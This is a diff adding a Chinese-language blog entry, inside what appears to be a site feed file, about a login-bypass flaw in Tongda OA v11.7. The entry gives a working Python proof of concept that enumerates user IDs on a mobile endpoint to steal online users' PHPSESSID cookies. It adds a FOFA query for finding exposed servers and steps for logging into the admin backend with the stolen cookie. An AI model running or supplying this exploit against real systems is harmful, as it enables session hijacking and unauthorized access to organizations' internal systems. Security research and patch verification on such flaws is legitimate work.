@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>通达OA v11.7 在线用户登录漏洞</title>
+      <link href="2021/04/14/SSV-99140/"/>
+      <url>2021/04/14/SSV-99140/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>有时候，当你说你赢了的时候，你就已经输了</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>此poc来源于网络（通过遍历uid的值，判断用户是否上线过，实现任意用户登录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        vuln_url = url + <span class="string">&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;P_VER=0&quot;</span></span><br><span class="line">        resp = requests.get(vuln_url)</span><br><span class="line">        soup = BeautifulSoup(resp.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;RELOGIN&#x27;</span> <span class="keyword">in</span> soup.get_text():</span><br><span class="line">            print(<span class="string">&quot;不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            PHPSESSION = re.findall(<span class="string">r&#x27;PHPSESSID=(.*?);&#x27;</span>, <span class="built_in">str</span>(resp.headers))</span><br><span class="line">            print(<span class="string">&#x27;uid=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;在线&quot;</span>+<span class="string">&quot;对应的COOKIE值是：PHPSESSID=&quot;</span>+<span class="built_in">str</span>(PHPSESSION[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><blockquote><p>fofa语法：app=”TDXK-通达OA”</p></blockquote><p>①.判断是否为在线用户（批量</p><p><a href="http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0">http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0</a></p><p>如果页面是空白的即为管理员在线可利用；反之RELOGIN即为下线状态无法利用</p><p>②.获取其cookie</p><p>③.此时访问 <a href="http://xxx.xx.xx.xx/general/">http://xxx.xx.xx.xx/general/</a> 即可登录后台</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414561249696.png"></p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414144213.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命令执行漏洞-亿邮邮箱系统（高危）</title>
       <link href="2021/04/13/yiyouemail/"/>
       <url>2021/04/13/yiyouemail/</url>
